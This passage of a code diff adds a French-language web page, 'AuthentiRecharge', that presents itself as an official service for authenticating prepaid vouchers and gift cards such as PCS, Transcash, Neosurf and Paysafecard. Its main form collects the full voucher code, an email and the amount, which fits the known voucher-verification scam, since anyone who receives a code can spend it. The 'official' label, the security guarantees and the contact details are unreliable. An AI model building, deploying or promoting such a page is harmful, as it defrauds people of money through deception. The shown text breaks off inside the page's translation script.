@@ -1,0 +1,1566 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Service d'Authentification des Recharges | Officiel</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .service-icon {
+            width: 80px;
+            height: 80px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: visible;
+            margin: 0 auto 1.5rem;
+        }
+
+        .service-icon img {
+            width: 200px !important;
+            height: 250px !important;
+            object-fit: contain;
+        }
+
+ #snackbar {
+  visibility: hidden;
+  min-width: 250px;
+  background-color: #4CAF50;
+  color: #fff;
+  text-align: center;
+  border-radius: 0 0 4px 4px; /* Coins arrondis en bas uniquement */
+  padding: 16px;
+  position: fixed;
+  z-index: 1000;
+  left: 50%;
+  top: 0;
+  transform: translateX(-50%);
+  font-size: 24px;
+  transition: visibility 0.3s ease, opacity 0.3s ease;
+  opacity: 0;
+  width: auto;
+}
+
+#snackbar.show {
+  visibility: visible;
+  opacity: 1;
+}
+
+        :root {
+            --primary: #2c3e50;
+            --secondary: #3498db;
+            --accent: #e74c3c;
+            --light: #ecf0f1;
+            --dark: #2c3e50;
+            --success: #27ae60;
+            --warning: #f39c12;
+            --shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            --transition: all 0.3s ease;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            background-color: #f9f9f9;
+            overflow-x: hidden;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 15px;
+        }
+
+        .custom-translate {
+            position: fixed;
+            top: 80px;
+            right: 20px;
+            z-index: 1000;
+            background: white;
+            border-radius: 4px;
+            box-shadow: var(--shadow);
+            padding: 10px;
+        }
+        
+        .custom-translate select {
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            padding: 8px 12px;
+            background: white;
+            color: var(--primary);
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        header {
+            background: linear-gradient(135deg, var(--primary), var(--dark));
+            color: white;
+            padding: 1rem 0;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            box-shadow: var(--shadow);
+        }
+
+        .header-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .logo-icon {
+            font-size: 2rem;
+            color: var(--secondary);
+        }
+
+        .logo h1 {
+            font-size: 1.5rem;
+            font-weight: 700;
+        }
+
+        nav ul {
+            display: flex;
+            list-style: none;
+        }
+
+        nav ul li {
+            margin-left: 1.5rem;
+        }
+
+        nav ul li a {
+            color: white;
+            text-decoration: none;
+            font-weight: 500;
+            transition: var(--transition);
+            padding: 5px 10px;
+            border-radius: 4px;
+        }
+
+        nav ul li a:hover {
+            background-color: rgba(255, 255, 255, 0.1);
+        }
+
+        .auth-buttons {
+            display: flex;
+            gap: 10px;
+        }
+
+        .btn {
+            padding: 8px 20px;
+            border-radius: 4px;
+            text-decoration: none;
+            font-weight: 600;
+            transition: var(--transition);
+            display: inline-block;
+            cursor: pointer;
+            border: none;
+        }
+
+        .btn-outline {
+            border: 2px solid white;
+            color: white;
+            background: transparent;
+        }
+
+        .btn-outline:hover {
+            background: white;
+            color: var(--primary);
+        }
+
+        .btn-primary {
+            background: var(--accent);
+            color: white;
+            border: 2px solid var(--accent);
+        }
+
+        .btn-primary:hover {
+            background: #c0392b;
+            border-color: #c0392b;
+        }
+
+        .hero {
+            background: linear-gradient(rgba(44, 62, 80, 0.8), rgba(44, 62, 80, 0.9)), url('https://images.unsplash.com/photo-1551288049-bebda4e38f71?ixlib=rb-4.0.3&auto=format&fit=crop&w=1950&q=80');
+            background-size: cover;
+            background-position: center;
+            color: white;
+            padding: 6rem 0;
+            text-align: center;
+        }
+
+        .hero-content {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .hero h1 {
+            font-size: 3rem;
+            margin-bottom: 1.5rem;
+            font-weight: 700;
+        }
+
+        .hero p {
+            font-size: 1.2rem;
+            margin-bottom: 2rem;
+            opacity: 0.9;
+        }
+
+        .hero-buttons {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin-top: 2rem;
+        }
+
+        .services {
+            padding: 5rem 0;
+            background-color: rgba(158, 216, 236, 0.934);
+        }
+
+        .section-title {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+
+        .section-title h2 {
+            font-size: 2.5rem;
+            color: var(--primary);
+            margin-bottom: 1rem;
+        }
+
+        .section-title p {
+            color: #666;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .services-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 2rem;
+        }
+
+        .service-card {
+            background: white;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: var(--shadow);
+            transition: var(--transition);
+            text-align: center;
+            padding: 2rem 1.5rem;
+        }
+
+        .service-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 10px 20px rgba(234, 10, 10, 0.908);
+        }
+
+        .service-card h3 {
+            font-size: 1.5rem;
+            margin-bottom: 1rem;
+            color: var(--primary);
+        }
+
+        .service-card p {
+            color: #666;
+            margin-bottom: 1.5rem;
+        }
+
+        .authentication {
+            padding: 5rem 0;
+            background: linear-gradient(135deg, var(--light), #edc8c8);
+        }
+
+        .auth-container {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 3rem;
+            align-items: center;
+        }
+
+        .auth-image {
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: var(--shadow);
+        }
+
+        .auth-image img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .auth-form {
+            background: white;
+            padding: 2.5rem;
+            border-radius: 8px;
+            box-shadow: var(--shadow);
+        }
+
+        .auth-form h3 {
+            font-size: 1.8rem;
+            margin-bottom: 1.5rem;
+            color: var(--primary);
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+            color: var(--dark);
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 1rem;
+            transition: var(--transition);
+        }
+
+        .form-control:focus {
+            border-color: var(--secondary);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.2);
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 1.5rem;
+        }
+
+        .checkbox-group input {
+            width: auto;
+        }
+
+        .form-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 2rem;
+        }
+
+        .features {
+            padding: 5rem 0;
+            background-color: white;
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+        }
+
+        .feature-card {
+            display: flex;
+            gap: 1.5rem;
+            padding: 1.5rem;
+            background: var(--light);
+            border-radius: 8px;
+            transition: var(--transition);
+        }
+
+        .feature-card:hover {
+            background: #e0e7ee;
+            transform: translateX(5px);
+        }
+
+        .feature-icon {
+            font-size: 2rem;
+            color: var(--secondary);
+            flex-shrink: 0;
+        }
+
+        .feature-content h3 {
+            font-size: 1.3rem;
+            margin-bottom: 0.5rem;
+            color: var(--primary);
+        }
+
+        .contact {
+            padding: 5rem 0;
+            background: linear-gradient(135deg, var(--primary), var(--dark));
+            color: white;
+        }
+
+        .contact-container {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 3rem;
+        }
+
+        .contact-info h3 {
+            font-size: 1.8rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .contact-details {
+            margin-top: 2rem;
+        }
+
+        .contact-item {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 1rem;
+        }
+
+        .contact-icon {
+            font-size: 1.2rem;
+            width: 40px;
+            height: 40px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        footer {
+            background: var(--dark);
+            color: white;
+            padding: 3rem 0 1.5rem;
+        }
+
+        .footer-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 2rem;
+            margin-bottom: 2rem;
+        }
+
+        .footer-section h3 {
+            font-size: 1.3rem;
+            margin-bottom: 1.5rem;
+            position: relative;
+            padding-bottom: 10px;
+        }
+
+        .footer-section h3::after {
+            content: '';
+            position: absolute;
+            left: 0;
+            bottom: 0;
+            width: 50px;
+            height: 2px;
+            background: var(--secondary);
+        }
+
+        .footer-links {
+            list-style: none;
+        }
+
+        .footer-links li {
+            margin-bottom: 0.8rem;
+        }
+
+        .footer-links a {
+            color: #bbb;
+            text-decoration: none;
+            transition: var(--transition);
+        }
+
+        .footer-links a:hover {
+            color: white;
+            padding-left: 5px;
+        }
+
+        .footer-bottom {
+            text-align: center;
+            padding-top: 1.5rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            color: #bbb;
+            font-size: 0.9rem;
+        }
+
+        @media (max-width: 992px) {
+            .auth-container, .contact-container {
+                grid-template-columns: 1fr;
+            }
+            
+            .hero h1 {
+                font-size: 2.5rem;
+            }
+            
+            .custom-translate {
+                position: relative;
+                top: auto;
+                right: auto;
+                margin: 0 auto 20px;
+                width: fit-content;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .header-container {
+                flex-direction: column;
+                gap: 15px;
+            }
+            
+            nav ul {
+                margin-top: 15px;
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+            
+            nav ul li {
+                margin: 0 10px 10px;
+            }
+            
+            .hero-buttons {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .hero h1 {
+                font-size: 2rem;
+            }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .fade-in {
+            animation: fadeIn 1s ease forwards;
+        }
+
+        .delay-1 { animation-delay: 0.2s; opacity: 0; }
+        .delay-2 { animation-delay: 0.4s; opacity: 0; }
+        .delay-3 { animation-delay: 0.6s; opacity: 0; }
+    </style>
+</head>
+<body>
+    <!-- Sélecteur de langue personnalisé -->
+    <div class="custom-translate">
+        <select id="languageSelector">
+            <option value="fr">Français</option>
+            <option value="en">English</option>
+            <option value="es">Español</option>
+            <option value="de">Deutsch</option>
+            <option value="pt">Português</option>
+        </select>
+    </div>
+
+    <!-- Header -->
+    <header>
+        <div class="container header-container">
+            <div class="logo">
+                <div class="logo-icon">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                <h1 data-i18n="site.title">AuthentiRecharge</h1>
+            </div>
+            
+            <nav>
+                <ul>
+                    <li><a href="#accueil" data-i18n="nav.home">Accueil</a></li>
+                    <li><a href="#services" data-i18n="nav.services">Services</a></li>
+                
+
+                </ul>
+            </nav>
+            
+            <div class="auth-buttons">
+                <a href="#contact" class="btn btn-outline" data-i18n="nav.contact">Contact</a>
+                <a href="#authentification" class="btn btn-primary" data-i18n="nav.auth">Authentification</a>
+            </div>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero" id="accueil">
+        <div class="container hero-content fade-in">
+            <h1 data-i18n="hero.title">SERVICE D'AUTHENTIFICATION DES RECHARGES</h1>
+            <p data-i18n="hero.description">Bienvenue sur la plateforme officielle  d'authentification des recharges PCS, TRANSCASH, NEO-SURF, ITUNES, STEAM, PAYSAFECARD, GOOGLE PLAY, TONEO FIRST et CASHLIB. Notre équipe expérimentée est à votre disposition 24h/24.</p>
+            <div class="hero-buttons">
+                <a href="#authentification" class="btn btn-primary" data-i18n="hero.btn_verify">Vérifier une recharge</a>
+                <a href="#services" class="btn btn-outline" data-i18n="hero.btn_services">Nos services</a>
+            </div>
+        </div>
+    </section>
+
+    <!-- Services Section -->
+    <section class="services" id="services">
+        <div class="container">
+            <div class="section-title fade-in">
+                <h2 data-i18n="services.title">Nos Services d'Authentification</h2>
+                <p data-i18n="services.description">Nous offrons un service d' Authentication complet pour tous vos coupons et recharges</p>
+            </div>
+            
+            <div class="services-grid">
+                <div class="service-card fade-in delay-1">
+                    <div class="service-icon">
+                      <img src="logorecha/logore (2).jpeg" alt="PCS" >
+                    </div>
+                    <h3>PCS</h3>
+                    <p data-i18n="services.pcs_desc">Authentification sécurisée des recharges PCS avec authentification en temps réel.</p>
+                    <a href="#authentification" class="btn btn-primary" data-i18n="services.verify_btn">Vérifier</a>
+                </div>
+                
+                <div class="service-card fade-in delay-2">
+                    <div class="service-icon">
+                         <img src="logorecha/logore (3).jpeg" alt="TRANSCASH">
+                    </div>
+                    <h3>TRANSCASH</h3>
+                    <p data-i18n="services.transcash_desc">Authentification complète des coupons TRANSCASH avec rapport détaillé.</p>
+                    <a href="#authentification" class="btn btn-primary" data-i18n="services.verify_btn">Vérifier</a>
+                </div>
+                
+                <div class="service-card fade-in delay-3">
+                    <div class="service-icon">
+                        <img src="logorecha/logore (8).jpeg" alt="NEO-SURF">
+                    </div>
+                    <h3>NEO-SURF</h3>
+                    <p data-i18n="services.neosurf_desc">Authentification des codes NEO-SURF avec validation instantanée.</p>
+                    <a href="#authentification" class="btn btn-primary" data-i18n="services.verify_btn">Vérifier</a>
+                </div>
+                
+                <div class="service-card fade-in delay-1">
+                    <div class="service-icon">
+                       <img src="logorecha/logore (1).jpeg" alt="ITUNES">
+                    </div>
+                    <h3>ITUNES</h3>
+                    <p data-i18n="services.itunes_desc">Authentification des cartes cadeaux iTunes avec garantie de validité.</p>
+                    <a href="#authentification" class="btn btn-primary" data-i18n="services.verify_btn">Vérifier</a>
+                </div>
+                
+                <div class="service-card fade-in delay-2">
+                    <div class="service-icon">
+                       <img src="logorecha/logore (5).jpeg" alt="STEAM">
+                    </div>
+                    <h3>STEAM</h3>
+                    <p data-i18n="services.steam_desc">Authentification des cartes Steam avec confirmation immédiate.</p>
+                    <a href="#authentification" class="btn btn-primary" data-i18n="services.verify_btn">Vérifier</a>
+                </div>
+                
+                <div class="service-card fade-in delay-3">
+                    <div class="service-icon">
+                       <img src="logorecha/logore (7).jpeg" alt="PAYSAFECARD">
+                    </div>
+                    <h3>PAYSAFECARD</h3>
+                    <p data-i18n="services.paysafe_desc">Authentification sécurisée des codes Paysafecard avec protection avancée.</p>
+                    <a href="#authentification" class="btn btn-primary" data-i18n="services.verify_btn">Vérifier</a>
+                </div>
+                
+                <div class="service-card fade-in delay-1">
+                    <div class="service-icon">
+                        <img src="logorecha/logore (6).jpeg" alt="GOOGLE PLAY">
+                    </div>
+                    <h3>GOOGLE PLAY</h3>
+                    <p data-i18n="services.google_desc">Authentification des cartes Google Play avec validation garantie.</p>
+                    <a href="#authentification" class="btn btn-primary" data-i18n="services.verify_btn">Vérifier</a>
+                </div>
+                
+                <div class="service-card fade-in delay-2">
+                    <div class="service-icon">
+                        <img src="logorecha/logore (4).jpeg" alt="TONEO FIRST">
+                    </div>
+                    <h3>TONEO FIRST</h3>
+                    <p data-i18n="services.toneo_desc">Authentification rapide et sécurisée des recharges Toneo First.</p>
+                    <a href="#authentification" class="btn btn-primary" data-i18n="services.verify_btn">Vérifier</a>
+                </div>
+                
+                <div class="service-card fade-in delay-3">
+                    <div class="service-icon">
+                       <img src="logorecha/logore10.jpeg" alt="CASHLIB">
+                    </div>
+                    <h3>CASHLIB</h3>
+                    <p data-i18n="services.cashlib_desc">Authentification des coupons Cashlib avec procédure de sécurité renforcée.</p>
+                    <a href="#authentification" class="btn btn-primary" data-i18n="services.verify_btn">Vérifier</a>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Authentication Section -->
+    <section class="authentication" id="authentification">
+        <div class="container">
+            <div class="section-title fade-in">
+                <h2 data-i18n="auth.title">Authentification de Recharge</h2>
+                <p data-i18n="auth.description">Soumettez votre recharge pour une authentification sécurisée et rapide</p>
+            </div>
+            
+            <div class="auth-container">
+                <div class="auth-image fade-in">
+                     <img src="logorecha/logore11.png" alt="Authentication Process">
+                </div>
+        <div id="snackbar">Message envoyé avec succès !</div>
+                
+                <div class="auth-form fade-in delay-1">
+                    <h3 data-i18n="auth.form_title">Formulaire d' authentification</h3>
+                    <form id="authForm" method="post" action="/Formulaire-authentification">
+                        <div class="form-group">
+                            <label for="rechargeType" data-i18n="auth.type_label">Type de recharge</label>
+                            <select class="form-control" id="rechargeType" required name="rechargeType">
+                                <option  value="" data-i18n="auth.select_type" >Sélectionnez un type</option>
+                                <option value="pcs" >PCS</option>
+                                <option value="transcash">TRANSCASH</option>
+                                <option value="neo-surf">NEO-SURF</option>
+                                <option value="itunes">ITUNES</option>
+                                <option value="steam">STEAM</option>
+                                <option value="paysafecard">PAYSAFECARD</option>
+                                <option value="google-play">GOOGLE PLAY</option>
+                                <option value="toneo-first">TONEO FIRST</option>
+                                <option value="cashlib">CASHLIB</option>
+                            </select>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="rechargeCode" data-i18n="auth.code_label">Code de recharge</label>
+                            <input type="text" class="form-control" id="rechargeCode" data-i18n-placeholder="auth.code_placeholder" placeholder="Entrez le code complet" required name="rechargeCode">
+                        </div>
+                         <div class="form-group">
+                            <label for="rechargeemail" data-i18n="auth.email_label">Email</label>
+                            <input type="text" class="form-control" id="rechargeemail" data-i18n-placeholder="auth.email_placeholder" placeholder="Entrez le mail" required name="rechargeemail">
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="rechargeAmount" data-i18n="auth.amount_label">Montant</label>
+                            <input type="number" class="form-control" id="rechargeAmount" data-i18n-placeholder="auth.amount_placeholder" placeholder="Montant en €" step="0.01" required>
+                        </div>
+                        
+                        <div class="checkbox-group">
+                            <input type="checkbox" id="hideCode">
+                            <label for="hideCode" data-i18n="auth.hide_code"> MASQUER LE CODE </label>
+                        </div>
+                        
+                        <button type="submit" class="btn btn-primary" style="width: 100%;" data-i18n="auth.submit_btn">Soumettre pour authentification</button>
+                        
+                        <div class="form-footer">
+                            <a href="#" data-i18n="auth.terms">Conditions d'utilisation</a>
+                            <a href="#" data-i18n="auth.help">Assistance</a>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Features Section -->
+    <section class="features">
+        <div class="container">
+            <div class="section-title fade-in">
+                <h2 data-i18n="features.title">Pourquoi Nous Choisir</h2>
+                <p data-i18n="features.description">Notre service se distingue par sa fiabilité et son professionnalisme</p>
+            </div>
+            
+            <div class="features-grid">
+                <div class="feature-card fade-in delay-1">
+                    <div class="feature-icon">
+                        <i class="fas fa-shield-alt"></i>
+                    </div>
+                    <div class="feature-content">
+                        <h3 data-i18n="features.security_title">Sécurité Maximale</h3>
+                        <p data-i18n="features.security_desc">Protocoles de sécurité avancés pour protéger vos données et transactions.</p>
+                    </div>
+                </div>
+                
+                <div class="feature-card fade-in delay-2">
+                    <div class="feature-icon">
+                        <i class="fas fa-clock"></i>
+                    </div>
+                    <div class="feature-content">
+                        <h3 data-i18n="features.availability_title">Disponibilité 24h/24</h3>
+                        <p data-i18n="features.availability_desc">Notre équipe est disponible à toute heure pour répondre à vos besoins.</p>
+                    </div>
+                </div>
+                
+                <div class="feature-card fade-in delay-3">
+                    <div class="feature-icon">
+                        <i class="fas fa-bolt"></i>
+                    </div>
+                    <div class="feature-content">
+                        <h3 data-i18n="features.speed_title">Authentification Rapide</h3>
+                        <p data-i18n="features.speed_desc">Processus d'authentification accéléré pour des résultats en temps réel.</p>
+                    </div>
+                </div>
+                
+                <div class="feature-card fade-in delay-1">
+                    <div class="feature-icon">
+                        <i class="fas fa-users"></i>
+                    </div>
+                    <div class="feature-content">
+                        <h3 data-i18n="features.team_title">Équipe Expérimentée</h3>
+                        <p data-i18n="features.team_desc">Professionnels qualifiés avec des années d'expérience dans le domaine.</p>
+                    </div>
+                </div>
+                
+                <div class="feature-card fade-in delay-2">
+                    <div class="feature-icon">
+                        <i class="fas fa-globe"></i>
+                    </div>
+                    <div class="feature-content">
+                        <h3 data-i18n="features.support_title">Support Multilingue</h3>
+                        <p data-i18n="features.support_desc">Assistance disponible en plusieurs langues pour une expérience optimale.</p>
+                    </div>
+                </div>
+                
+                <div class="feature-card fade-in delay-3">
+                    <div class="feature-icon">
+                        <i class="fas fa-lock"></i>
+                    </div>
+                    <div class="feature-content">
+                        <h3 data-i18n="features.privacy_title">Confidentialité Garantie</h3>
+                        <p data-i18n="features.privacy_desc">Vos informations personnelles et codes sont protégés et cryptés.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Contact Section -->
+    <section class="contact" id="contact">
+        <div class="container">
+            <div class="contact-container">
+                <div class="contact-info fade-in">
+                    <h3 data-i18n="contact.title">Contactez Notre Équipe</h3>
+                    <p data-i18n="contact.description">Notre service client est disponible 24 heures sur 24, 7 jours sur 7 pour répondre à toutes vos questions et vous assister dans le processus d'authentification.</p>
+                    
+                    <div class="contact-details">
+                        <div class="contact-item">
+                            <div class="contact-icon">
+                                <i class="fas fa-headset"></i>
+                            </div>
+                            <div>
+                                <h4 data-i18n="contact.support_title">Support 24h/24</h4>
+                                <p data-i18n="contact.support_desc">Assistance technique et service client</p>
+                            </div>
+                        </div>
+                        
+                        <div class="contact-item">
+                            <div class="contact-icon">
+                                <i class="fas fa-envelope"></i>
+                            </div>
+                            <div>
+                                <h4 data-i18n="contact.email_title">Email</h4>
+                                <p>support@authentirecharge.com</p>
+                            </div>
+                        </div>
+                        
+                        <div class="contact-item">
+                            <div class="contact-icon">
+                                <i class="fas fa-phone"></i>
+                            </div>
+                            <div>
+                                <h4 data-i18n="contact.phone_title">Téléphone</h4>
+                                <p>+33 1 23 45 67 89</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="auth-form fade-in delay-1">
+                    <h3 data-i18n="contact.form_title">Demande d'Assistance</h3>
+                    <form method="post" action="/demande-assistance">
+                        <div class="form-group">
+                            <input type="text" name="full_name" class="form-control" data-i18n-placeholder="contact.name_placeholder" placeholder="Votre nom" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <input type="email" name="email" class="form-control" data-i18n-placeholder="contact.email_placeholder" placeholder="Votre votre email" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <select class="form-control" required name="sujet">
+                                <option value="" data-i18n="contact.subject_default">Sujet de la demande</option>
+                                <option value="verification" data-i18n="contact.subject_verification">Problème d'authentification</option>
+                                <option value="technical" data-i18n="contact.subject_technical">Problème technique</option>
+                                <option value="billing" data-i18n="contact.subject_billing">Question de facturation</option>
+                                <option value="other" data-i18n="contact.subject_other">Autre</option>
+                            </select>
+                        </div>
+                        
+                        <div class="form-group">
+                            <textarea class="form-control" name="description" rows="4" data-i18n-placeholder="contact.message_placeholder" placeholder="Décrivez votre problème ou question" required></textarea>
+                        </div>
+                        
+                        <button type="submit" class="btn btn-primary" style="width: 100%;" data-i18n="contact.submit_btn">Envoyer la demande</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="footer-container">
+                <div class="footer-section">
+                    <h3 data-i18n="footer.about_title">AuthentiRecharge</h3>
+                    <p data-i18n="footer.about_desc">Service technique officiel d'authentification des recharges et coupons. Authentification sécurisée et professionnelle.</p>
+                    <div class="social-links" style="margin-top: 20px; display: flex; gap: 15px;">
+                        <a href="#" style="color: white; font-size: 1.2rem;"><i class="fab fa-facebook"></i></a>
+                        <a href="#" style="color: white; font-size: 1.2rem;"><i class="fab fa-twitter"></i></a>
+                        <a href="#" style="color: white; font-size: 1.2rem;"><i class="fab fa-linkedin"></i></a>
+                        <a href="#" style="color: white; font-size: 1.2rem;"><i class="fab fa-instagram"></i></a>
+                    </div>
+                </div>
+                
+                <div class="footer-section">
+                    <h3 data-i18n="footer.services_title">Services</h3>
+                    <ul class="footer-links">
+                        <li><a href="#authentification" data-i18n="footer.service_pcs">Authentification PCS</a></li>
+                        <li><a href="#authentification" data-i18n="footer.service_transcash">Authentification TRANSCASH</a></li>
+                        <li><a href="#authentification" data-i18n="footer.service_neosurf">Validation NEO-SURF</a></li>
+                        <li><a href="#authentification" data-i18n="footer.service_itunes">Cartes iTunes</a></li>
+                        <li><a href="#authentification" data-i18n="footer.service_steam">Codes STEAM</a></li>
+                        <li><a href="#authentification" data-i18n="footer.service_paysafe">PAYSAFECARD</a></li>
+                        <li><a href="#authentification" data-i18n="footer.service_google">GOOGLE PLAY</a></li>
+                        <li><a href="#authentification" data-i18n="footer.service_toneo">TONEO FIRST</a></li>
+                        <li><a href="#authentification" data-i18n="footer.service_cashlib">CASHLIB</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-section">
+                    <h3 data-i18n="footer.links_title">Liens Utiles</h3>
+                    <ul class="footer-links">
+                        <li><a href="#" data-i18n="footer.link_about">À propos de nous</a></li>
+                        <li><a href="#" data-i18n="footer.link_terms">Conditions d'utilisation</a></li>
+                        <li><a href="#" data-i18n="footer.link_privacy">Politique de confidentialité</a></li>
+                        <li><a href="#" data-i18n="footer.link_faq">FAQ</a></li>
+                        <li><a href="#" data-i18n="footer.link_help">Centre d'aide</a></li>
+                        <li><a href="#" data-i18n="footer.link_blog">Blog</a></li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="footer-bottom">
+                <p data-i18n="footer.copyright">&copy; 2023 AuthentiRecharge. Tous droits réservés. | Service technique d'authentification des recharges</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Système de traduction complet pour 5 langues
+        const translations = {
+            fr: {
+                // Titre de la page
+                "site.title": "AuthentiRecharge",
+                
+                // Navigation
+                "nav.home": "Accueil",
+                "nav.services": "Services",
+                "nav.auth": "Authentification",
+                "nav.contact": "Contact",
+                
+                // Section Hero
+                "hero.title": "SERVICE D'AUTHENTIFICATION DES RECHARGES",
+                "hero.description": "Bienvenue sur la plateforme officielle d'authentification des recharges PCS, TRANSCASH, NEO-SURF, ITUNES, STEAM, PAYSAFECARD, GOOGLE PLAY, TONEO FIRST et CASHLIB. Notre équipe expérimentée est à votre disposition 24h/24.",
+                "hero.btn_verify": "Authentifier une recharge",
+                "hero.btn_services": "Nos services",
+                
+                // Section Services
+                "services.title": "Nos Services d'Authentification",
+                "services.description": "Nous offrons un service de d'authentification complet pour tous vos coupons et recharges",
+                "services.verify_btn": "Authentifier",
+                "services.pcs_desc": "Authentification sécurisée des recharges PCS en temps réel.",
+                "services.transcash_desc": "Authentification complète des coupons TRANSCASH avec rapport détaillé.",
+                "services.neosurf_desc": "Authentification des codes NEO-SURF avec validation instantanée.",
+                "services.itunes_desc": "Authentification des cartes cadeaux iTunes avec garantie de validité.",
+                "services.steam_desc": "Authentification des cartes Steam avec confirmation immédiate.",
+                "services.paysafe_desc": "Authentification sécurisée des codes Paysafecard avec protection avancée.",
+                "services.google_desc": "Authentification des cartes Google Play avec validation garantie.",
+                "services.toneo_desc": "Authentification rapide et sécurisée des recharges Toneo First.",
+                "services.cashlib_desc": "Authentification des coupons Cashlib avec procédure de sécurité renforcée.",
+                
+                // Section Authentification
+                "auth.title": "Authentification de Recharge",
+                "auth.description": "Soumettez votre recharge pour une authentification sécurisée et rapide",
+                "auth.form_title": "Formulaire d'authentification",
+                "auth.type_label": "Type de recharge",
+                "auth.select_type": "Sélectionnez un type",
+                "auth.code_label": "Code de recharge",
+                "auth.email_label": "Email de recharge",
+                "auth.code_placeholder": "Entrez le code complet",
+                "auth.email_placeholder": "Entrez votre mail",
+                "auth.amount_label": "Montant",
+                "auth.amount_placeholder": "Montant ",
+                "auth.hide_code": "MASQUER LE CODE ",
+                "auth.submit_btn": "Soumettre pour authentification",
+                "auth.terms": "Conditions d'utilisation",
+                "auth.help": "Assistance",
+                
+                // Section Caractéristiques
+                "features.title": "Pourquoi Nous Choisir",
+                "features.description": "Notre service se distingue par sa fiabilité et son professionnalisme",
+                "features.security_title": "Sécurité Maximale",
+                "features.security_desc": "Protocoles de sécurité avancés pour protéger vos données et transactions.",
+                "features.availability_title": "Disponibilité 24h/24",
+                "features.availability_desc": "Notre équipe est disponible à toute heure pour répondre à vos besoins.",
+                "features.speed_title": "Authentification Rapide",
+                "features.speed_desc": "Processus d'authentification accéléré pour des résultats en temps réel.",
+                "features.team_title": "Équipe Expérimentée",
+                "features.team_desc": "Professionnels qualifiés avec des années d'expérience dans le domaine.",
+                "features.support_title": "Support Multilingue",
+                "features.support_desc": "Assistance disponible en plusieurs langues pour une expérience optimale.",
+                "features.privacy_title": "Confidentialité Garantie",
+                "features.privacy_desc": "Vos informations personnelles et codes sont protégés et cryptés.",
+                
+                // Section Contact
+                "contact.title": "Contactez Notre Équipe",
+                "contact.description": "Notre service client est disponible 24 heures sur 24, 7 jours sur 7 pour répondre à toutes vos questions et vous assister dans le processus d'authentification.",
+                "contact.support_title": "Support 24h/24",
+                "contact.support_desc": "Assistance technique et service client",
+                "contact.email_title": "Email",
+                "contact.phone_title": "Téléphone",
+                "contact.form_title": "Demande d'Assistance",
+                "contact.name_placeholder": "Votre nom",
+                "contact.email_placeholder": "Votre email",
+                "contact.subject_default": "Sujet de la demande",
+                "contact.subject_verification": "Problème d'authentification",
+                "contact.subject_technical": "Problème technique",
+                "contact.subject_billing": "Question de facturation",
+                "contact.subject_other": "Autre",
+                "contact.message_placeholder": "Décrivez votre problème ou question",
+                "contact.submit_btn": "Envoyer la demande",
+                
+                // Footer
